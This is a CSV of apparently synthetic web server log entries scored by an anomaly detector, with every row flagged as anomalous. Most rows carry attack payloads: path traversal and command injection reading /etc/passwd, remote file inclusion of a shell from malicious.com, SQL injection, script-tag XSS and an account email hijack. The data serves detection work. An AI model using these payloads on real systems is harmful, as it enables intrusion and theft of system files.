ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
146.67.53.187,2025-03-15 12:14:54,POST /change-email?email=attacker@example.com HTTP/1.1,403,4983,1.7205521013091891,False,54,403,True,True
219.146.209.101,2025-03-15 12:15:12,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,985,-1.349201043986952,False,51,403,True,True
147.4.107.242,2025-03-15 12:15:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,879,-1.430590196913763,False,59,200,True,True
22.189.33.30,2025-03-15 12:15:35,GET /api/user?username=admin HTTP/1.1,403,4996,1.730533789875685,False,37,403,True,True
42.33.147.164,2025-03-15 12:14:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,745,-1.533478371368411,False,60,200,True,True
194.98.95.196,2025-03-15 12:14:57,GET /api/user?username=admin HTTP/1.1,403,619,-1.6302239682436772,False,37,403,True,True
21.59.233.179,2025-03-15 12:15:36,POST /change-email?email=attacker@example.com HTTP/1.1,403,2574,-0.1291315722822075,False,54,403,True,True
57.150.223.204,2025-03-15 12:15:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,578,-1.6617046783380098,False,60,200,True,True
66.177.34.13,2025-03-15 12:15:08,GET /admin HTTP/1.1,403,4790,1.572362417206599,False,19,403,True,True
111.255.242.26,2025-03-15 12:15:25,POST /change-email?email=attacker@example.com HTTP/1.1,403,1917,-0.6335907559889521,False,54,403,True,True
74.153.100.117,2025-03-15 12:15:27,GET /search?q=' OR '1'='1 HTTP/1.1,403,512,-1.7123809433679111,False,34,403,True,True
25.6.214.201,2025-03-15 12:15:12,GET /execute?cmd=whoami HTTP/1.1,403,560,-1.6755254778916193,False,32,403,True,True
9.119.65.90,2025-03-15 12:15:14,POST /change-email?email=attacker@example.com HTTP/1.1,403,3492,0.575729204951874,False,54,403,True,True
214.198.48.238,2025-03-15 12:15:36,POST /change-email?email=attacker@example.com HTTP/1.1,403,4523,1.3673538904947258,False,54,403,True,True
96.107.151.13,2025-03-15 12:15:46,GET /etc/passwd HTTP/1.1,403,4962,1.7044278351633115,False,24,403,True,True
201.159.135.233,2025-03-15 12:15:17,POST /change-email?email=attacker@example.com HTTP/1.1,403,3462,0.5526945390291915,False,54,403,True,True
42.127.234.155,2025-03-15 12:15:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4651,1.4656351317648373,False,47,200,True,True
78.170.11.239,2025-03-15 12:15:25,POST /change-email?email=attacker@example.com HTTP/1.1,403,1308,-1.1011944742194049,False,54,403,True,True
75.216.153.105,2025-03-15 12:15:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,659,-1.5995110803467674,False,51,403,True,True
25.23.234.177,2025-03-15 12:14:52,POST /change-email?email=attacker@example.com HTTP/1.1,403,1118,-1.2470806917297266,False,54,403,True,True
160.139.207.37,2025-03-15 12:15:48,GET /admin HTTP/1.1,403,4361,1.2429666945122408,False,19,403,True,True
243.144.216.166,2025-03-15 12:15:43,POST /change-email?email=attacker@example.com HTTP/1.1,403,3841,0.8436991518524125,False,54,403,True,True
25.130.57.66,2025-03-15 12:14:53,GET /search?q=' OR '1'='1 HTTP/1.1,403,4990,1.7259268566911483,False,34,403,True,True
41.22.76.187,2025-03-15 12:15:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,591,-1.6517229897715142,False,60,200,True,True
43.156.132.103,2025-03-15 12:15:34,GET /api/user?username=admin HTTP/1.1,403,4990,1.7259268566911483,False,37,403,True,True
193.131.215.100,2025-03-15 12:15:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4545,1.3842459788380261,False,51,403,True,True
16.141.21.24,2025-03-15 12:15:36,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,778,-1.5081402388534606,False,59,200,True,True
90.23.32.191,2025-03-15 12:15:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4037,0.9941923025472709,False,47,200,True,True
176.166.243.130,2025-03-15 12:15:10,GET /admin HTTP/1.1,403,596,-1.6478838787844003,False,19,403,True,True
91.14.205.130,2025-03-15 12:14:58,GET /execute?cmd=whoami HTTP/1.1,403,605,-1.6409734790075956,False,32,403,True,True
51.244.25.28,2025-03-15 12:16:09,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4345,1.230681539353477,False,47,403,True,True
9.131.245.216,2025-03-15 12:16:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4595,1.4226370887091635,False,51,403,True,True
209.233.238.165,2025-03-15 12:16:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,834,-1.4651421957977866,False,60,200,True,True
200.90.94.39,2025-03-15 12:17:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1231,-1.1603167834209562,False,60,200,True,True
20.101.49.192,2025-03-15 12:16:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3920,0.9043571054488094,False,60,200,True,True
60.221.240.8,2025-03-15 12:16:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4948,1.6936783243993931,False,47,403,True,True
199.12.194.251,2025-03-15 12:16:26,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4383,1.2598587828555412,False,47,403,True,True
127.111.244.175,2025-03-15 12:17:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4220,1.1347037646756335,False,60,200,True,True
141.58.190.64,2025-03-15 12:16:12,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,846,-1.4559283294287138,False,51,403,True,True
52.137.58.68,2025-03-15 12:17:03,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,865,-1.4413397076776815,False,47,403,True,True
187.154.213.144,2025-03-15 12:16:36,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4947,1.6929105022019704,False,51,403,True,True
222.0.80.188,2025-03-15 12:16:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4444,1.3066959368983286,False,47,403,True,True
164.177.222.221,2025-03-15 12:16:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4940,1.687535746820011,False,60,200,True,True
143.91.28.84,2025-03-15 12:16:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,852,-1.4513213962441773,False,60,200,True,True
226.240.65.52,2025-03-15 12:16:16,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4767,1.554702506665876,False,51,403,True,True
242.136.76.87,2025-03-15 12:17:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,590,-1.6524908119689368,False,54,200,True,True
42.127.90.13,2025-03-15 12:16:39,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,720,-1.5526739263039797,False,47,403,True,True
198.43.218.97,2025-03-15 12:16:48,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4319,1.2107181622204854,False,51,403,True,True
111.171.35.5,2025-03-15 12:16:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,4277,1.17846962992873,False,54,200,True,True
187.248.75.213,2025-03-15 12:16:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1556,-0.9107745692585636,False,60,200,True,True
73.97.86.25,2025-03-15 12:16:57,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4355,1.2383597613277042,False,51,403,True,True
74.16.0.74,2025-03-15 12:16:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3397,0.502786096196713,False,60,200,True,True
21.208.120.252,2025-03-15 12:17:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1130,-1.2378668253606537,False,60,200,True,True
2.47.84.117,2025-03-15 12:16:47,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,562,-1.6739898334967738,False,51,403,True,True
145.198.245.114,2025-03-15 12:16:59,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4732,1.5278287297560798,False,51,403,True,True
1.56.144.81,2025-03-15 12:16:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4052,1.0057096355086121,False,60,200,True,True
122.222.30.120,2025-03-15 12:17:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1476,-0.9722003450523833,False,60,200,True,True
162.112.51.1,2025-03-15 12:17:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3839,0.842163507457567,False,60,200,True,True
246.160.201.255,2025-03-15 12:16:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1315,-1.0958197188374454,False,60,200,True,True
222.6.255.92,2025-03-15 12:16:32,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4837,1.6084500604854681,False,47,403,True,True
222.45.251.13,2025-03-15 12:16:34,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4526,1.3696573570869939,False,51,403,True,True
229.6.160.242,2025-03-15 12:17:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,4087,1.0325834124184081,False,54,200,True,True
218.186.213.40,2025-03-15 12:17:08,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4731,1.527060907558657,False,47,403,True,True
217.45.8.49,2025-03-15 12:16:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4613,1.436457888262773,False,47,403,True,True
14.22.57.218,2025-03-15 12:16:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,802,-1.4897125061153145,False,59,200,True,True
127.157.29.246,2025-03-15 12:16:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,617,-1.6317596126385228,False,54,200,True,True
19.82.226.145,2025-03-15 12:17:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1889,-0.655089777516789,False,60,200,True,True
56.249.74.87,2025-03-15 12:16:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3900,0.8890006615003545,False,60,200,True,True
28.250.82.12,2025-03-15 12:16:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1146,-1.2255816702018898,False,60,200,True,True
253.141.215.211,2025-03-15 12:16:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,882,-1.4282867303214948,False,51,403,True,True
71.42.165.50,2025-03-15 12:16:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4982,1.7197842791117663,False,60,200,True,True
35.158.115.119,2025-03-15 12:16:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4426,1.2928751373447194,False,59,200,True,True
21.87.142.136,2025-03-15 12:16:36,POST /login HTTP/1.1,401,4998,1.7320694342705303,False,20,401,True,True
178.26.210.114,2025-03-15 12:17:12,POST /change-email?email=attacker@example.com HTTP/1.1,200,4751,1.542417351507112,False,54,200,True,True
218.73.249.189,2025-03-15 12:17:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4549,1.387317267627717,False,47,403,True,True
164.113.221.212,2025-03-15 12:16:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1241,-1.1526385614467287,False,60,200,True,True
250.187.149.192,2025-03-15 12:16:43,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4387,1.262930071645232,False,60,200,True,True
76.254.81.204,2025-03-15 12:16:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4781,1.5654520174297943,False,60,200,True,True
142.19.217.228,2025-03-15 12:17:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3432,0.5296598731065091,False,60,200,True,True
84.199.66.4,2025-03-15 12:17:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,587,-1.654794278561205,False,51,403,True,True
108.252.207.209,2025-03-15 12:16:30,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,870,-1.4375005966905678,False,47,403,True,True
5.159.17.154,2025-03-15 12:17:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4664,1.475616820331333,False,59,200,True,True
203.219.78.23,2025-03-15 12:17:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4847,1.6161282824596956,False,51,403,True,True
129.183.174.196,2025-03-15 12:17:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3368,0.48051925247145333,False,60,200,True,True
126.93.40.106,2025-03-15 12:17:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4984,1.721319923506612,False,60,200,True,True
169.151.118.253,2025-03-15 12:17:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,1051,-1.2985247789570507,False,54,200,True,True
177.60.229.78,2025-03-15 12:17:01,POST /change-email?email=attacker@example.com HTTP/1.1,200,4797,1.5777371725885583,False,54,200,True,True
209.63.141.22,2025-03-15 12:16:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,557,-1.6778289444838874,False,54,200,True,True
231.240.249.110,2025-03-15 12:17:19,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4589,1.418030155524627,False,51,403,True,True
53.146.77.179,2025-03-15 12:16:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4704,1.5063297082282427,False,60,200,True,True
242.110.213.70,2025-03-15 12:16:28,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,911,-1.4060198865962352,False,51,403,True,True
106.174.199.225,2025-03-15 12:16:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4843,1.6130569936700045,False,51,403,True,True
45.154.245.135,2025-03-15 12:17:25,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4455,1.315141981069979,False,59,200,True,True
78.34.131.128,2025-03-15 12:16:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1606,-0.8723834593874262,False,60,200,True,True
31.165.161.81,2025-03-15 12:17:01,POST /change-email?email=attacker@example.com HTTP/1.1,200,587,-1.654794278561205,False,54,200,True,True
122.5.243.250,2025-03-15 12:16:43,POST /change-email?email=attacker@example.com HTTP/1.1,200,4215,1.1308646536885198,False,54,200,True,True
10.205.191.167,2025-03-15 12:17:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1850,-0.6850348432162761,False,60,200,True,True
76.224.142.227,2025-03-15 12:17:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,981,-1.3522723327766428,False,51,403,True,True
113.110.197.155,2025-03-15 12:17:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,539,-1.691649744037497,False,60,200,True,True
149.221.73.95,2025-03-15 12:16:33,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4501,1.3504618021514252,False,51,403,True,True
120.239.99.229,2025-03-15 12:17:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,4359,1.2414310501173953,False,54,200,True,True
117.209.114.234,2025-03-15 12:16:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3455,0.5473197836472323,False,60,200,True,True
246.6.189.46,2025-03-15 12:17:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1745,-0.7656561739456645,False,60,200,True,True
44.92.132.18,2025-03-15 12:16:39,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,577,-1.6624725005354326,False,59,200,True,True
167.6.127.62,2025-03-15 12:17:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4839,1.6099857048803137,False,51,403,True,True
134.28.141.49,2025-03-15 12:17:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,4710,1.5109366414127794,False,54,200,True,True
192.130.31.176,2025-03-15 12:16:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,784,-1.503533305668924,False,54,200,True,True
118.225.111.144,2025-03-15 12:17:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,617,-1.6317596126385228,False,60,200,True,True
35.15.226.103,2025-03-15 12:16:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4465,1.3228202030442064,False,51,403,True,True
195.11.176.36,2025-03-15 12:16:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4342,1.2283780727612086,False,60,200,True,True
234.155.150.7,2025-03-15 12:16:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,705,-1.564191259265321,False,59,200,True,True
225.215.96.75,2025-03-15 12:16:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4456,1.3159098032674017,False,60,200,True,True
11.105.17.213,2025-03-15 12:17:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4765,1.5531668622710304,False,59,200,True,True
86.154.175.56,2025-03-15 12:16:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,633,-1.6194744574797588,False,60,200,True,True
202.221.148.171,2025-03-15 12:16:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,620,-1.6294561460462544,False,54,200,True,True
9.56.183.71,2025-03-15 12:16:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4770,1.557005973258144,False,60,200,True,True
102.184.233.219,2025-03-15 12:17:15,POST /change-email?email=attacker@example.com HTTP/1.1,200,4506,1.354300913138539,False,54,200,True,True
245.63.170.242,2025-03-15 12:17:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4866,1.630716904210728,False,60,200,True,True
219.145.235.214,2025-03-15 12:17:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,696,-1.5711016590421256,False,59,200,True,True
207.159.227.100,2025-03-15 12:17:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,505,-1.7177556987498703,False,60,200,True,True
167.188.43.149,2025-03-15 12:16:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,558,-1.6770611222864649,False,51,403,True,True
188.3.239.28,2025-03-15 12:17:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4026,0.9857462583756206,False,60,200,True,True
255.146.178.42,2025-03-15 12:16:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,510,-1.7139165877627567,False,51,403,True,True
198.209.196.125,2025-03-15 12:17:22,POST /change-email?email=attacker@example.com HTTP/1.1,200,4672,1.4817593979107149,False,54,200,True,True
4.155.187.221,2025-03-15 12:17:20,POST /change-email?email=attacker@example.com HTTP/1.1,200,4197,1.1170438541349104,False,54,200,True,True
140.24.210.194,2025-03-15 12:16:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1002,-1.3361480666307652,False,60,200,True,True
62.70.254.173,2025-03-15 12:17:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,766,-1.5173541052225334,False,51,403,True,True
247.69.228.32,2025-03-15 12:17:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1402,-1.0290191876616666,False,60,200,True,True
37.72.68.163,2025-03-15 12:17:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1239,-1.1541742058415743,False,60,200,True,True
236.241.58.84,2025-03-15 12:16:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4765,1.5531668622710304,False,51,403,True,True
23.158.123.31,2025-03-15 12:17:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2974,0.17799730668689115,False,60,200,True,True
43.201.76.70,2025-03-15 12:17:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4327,1.2168607397998674,False,47,403,True,True
75.133.85.92,2025-03-15 12:17:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,711,-1.5595843260807845,False,47,403,True,True
53.10.61.158,2025-03-15 12:17:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,894,-1.419072863952422,False,60,200,True,True
25.230.130.26,2025-03-15 12:17:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,790,-1.4989263724843875,False,47,403,True,True
71.222.28.185,2025-03-15 12:17:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,527,-1.70086361040657,False,59,200,True,True
148.200.218.121,2025-03-15 12:16:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,3917,0.9020536388565412,False,54,200,True,True
175.143.167.53,2025-03-15 12:17:13,POST /change-email?email=attacker@example.com HTTP/1.1,200,4402,1.2744474046065735,False,54,200,True,True
208.36.68.236,2025-03-15 12:16:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3061,0.2447978378626701,False,60,200,True,True
29.209.255.162,2025-03-15 12:17:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3174,0.33156174617144046,False,60,200,True,True
230.249.248.74,2025-03-15 12:17:20,POST /change-email?email=attacker@example.com HTTP/1.1,200,4386,1.2621622494478095,False,54,200,True,True
201.116.231.83,2025-03-15 12:16:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3134,0.3008488582745306,False,60,200,True,True
94.159.29.181,2025-03-15 12:16:47,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4504,1.3527652687436935,False,47,403,True,True
137.62.191.74,2025-03-15 12:17:02,POST /change-email?email=attacker@example.com HTTP/1.1,200,4810,1.587718861155054,False,54,200,True,True
157.56.102.116,2025-03-15 12:17:33,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4763,1.5516312178761849,False,47,403,True,True
106.33.67.60,2025-03-15 12:17:27,POST /change-email?email=attacker@example.com HTTP/1.1,200,925,-1.3952703758323168,False,54,200,True,True
190.6.172.86,2025-03-15 12:17:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4530,1.372728645876685,False,47,403,True,True
157.221.43.244,2025-03-15 12:17:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4601,1.4272440218937,False,47,403,True,True
18.236.204.18,2025-03-15 12:17:13,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,787,-1.5012298390766559,False,59,200,True,True
14.255.250.249,2025-03-15 12:17:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1873,-0.6673749326755529,False,60,200,True,True
142.63.186.227,2025-03-15 12:17:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4935,1.6836966358328973,False,60,200,True,True
104.1.190.9,2025-03-15 12:17:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1573,-0.8977215919023769,False,60,200,True,True
150.143.2.186,2025-03-15 12:17:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4303,1.1984330070617215,False,60,200,True,True
180.178.65.143,2025-03-15 12:17:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4729,1.5255252631638114,False,47,403,True,True
195.32.134.144,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4019,0.9803715029936614,False,60,200,True,True
124.39.90.5,2025-03-15 12:17:36,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4380,1.2575553162632729,False,59,200,True,True
85.148.31.12,2025-03-15 12:16:57,POST /change-email?email=attacker@example.com HTTP/1.1,200,4800,1.5800406391808266,False,54,200,True,True
244.189.86.234,2025-03-15 12:17:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3539,0.611816848230743,False,60,200,True,True
25.117.56.34,2025-03-15 12:16:49,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1030,-1.3146490451029282,False,59,200,True,True
134.228.177.102,2025-03-15 12:17:09,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4806,1.584647572365363,False,51,403,True,True
9.149.126.12,2025-03-15 12:16:52,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3943,0.9220170159895327,False,60,200,True,True
104.204.144.187,2025-03-15 12:17:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1111,-1.2524554471116858,False,59,200,True,True
76.97.182.195,2025-03-15 12:17:16,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4462,1.3205167364519381,False,51,403,True,True
149.220.169.136,2025-03-15 12:17:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,1004,-1.3346124222359197,False,54,200,True,True
8.15.195.177,2025-03-15 12:17:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4035,0.9926566581524253,False,60,200,True,True
51.255.18.201,2025-03-15 12:17:19,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4572,1.4049771781684404,False,51,403,True,True
52.224.61.210,2025-03-15 12:17:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,866,-1.4405718854802587,False,59,200,True,True
156.133.89.152,2025-03-15 12:16:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3908,0.8951432390797365,False,60,200,True,True
64.98.90.187,2025-03-15 12:17:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,716,-1.5557452150936708,False,54,200,True,True
27.103.165.28,2025-03-15 12:17:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4629,1.448743043421537,False,51,403,True,True
14.20.0.67,2025-03-15 12:16:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2925,0.14037401901317656,False,60,200,True,True
191.54.2.218,2025-03-15 12:17:17,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4878,1.6399307705798007,False,51,403,True,True
125.48.218.173,2025-03-15 12:17:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,937,-1.3860565094632438,False,59,200,True,True
163.93.12.189,2025-03-15 12:17:18,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4211,1.1277933648988288,False,60,200,True,True
150.79.16.87,2025-03-15 12:17:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,667,-1.5933685027673854,False,59,200,True,True
231.188.245.53,2025-03-15 12:17:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1530,-0.930737946391555,False,60,200,True,True
216.122.36.210,2025-03-15 12:17:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4594,1.4218692665117407,False,47,403,True,True
165.17.142.136,2025-03-15 12:17:00,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4679,1.4871341532926743,False,47,403,True,True
113.199.162.86,2025-03-15 12:17:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4979,1.7174808125194982,False,47,403,True,True
85.109.7.197,2025-03-15 12:16:54,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4696,1.5001871306488608,False,47,403,True,True
37.145.207.85,2025-03-15 12:17:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,1035,-1.3108099341158146,False,54,200,True,True
140.204.39.26,2025-03-15 12:17:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4501,1.3504618021514252,False,51,403,True,True
214.203.204.217,2025-03-15 12:16:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,790,-1.4989263724843875,False,54,200,True,True
201.159.14.169,2025-03-15 12:17:42,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4563,1.3980667783916356,False,47,403,True,True
16.68.194.176,2025-03-15 12:17:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,911,-1.4060198865962352,False,60,200,True,True
249.20.20.108,2025-03-15 12:16:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,4608,1.4326187772756591,False,54,200,True,True
137.216.72.117,2025-03-15 12:17:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2903,0.12348193066987613,False,60,200,True,True
